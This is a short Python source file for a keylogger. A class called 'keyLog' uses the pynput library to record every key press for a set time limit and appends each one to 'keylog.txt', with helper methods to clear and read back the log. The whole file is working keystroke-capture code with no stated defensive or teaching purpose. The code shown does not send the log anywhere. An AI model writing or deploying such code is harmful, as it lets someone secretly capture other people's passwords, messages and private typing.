from pynput import keyboard
import time

class keyLog:
    def clearFile(self, file_path):
        with open(file_path, 'w') as file:
                file.truncate(0)
    # Function to handle key press events and save them to a file with UTF-8 encoding
    def on_key_event(key, is_press=True):
        try:
            if is_press:    
                with open("keylog.txt", "a", encoding='utf-8') as f:
                    f.write('Key pressed: {0}\n'.format(key))
        except AttributeError:
            pass  # Handle special keys gracefully

    def read_file(self, file_path):
        try:
            with open(file_path, 'r') as file:
                body = file.read()
            return body
        except FileNotFoundError:
            print(f"File not found: {file_path}")
            return None
        
    def run_keyLog(self, time_limit):
        duration = time_limit
        # Record the start time
        start_time = time.time()
        # Create a listener for both key press and release events
        with keyboard.Listener(on_press=lambda key: keyLog.on_key_event(key, is_press=True),
                            on_release=lambda key: keyLog.on_key_event(key, is_press=False)) as listener:
            while time.time() - start_time < duration:
                pass
            listener.stop()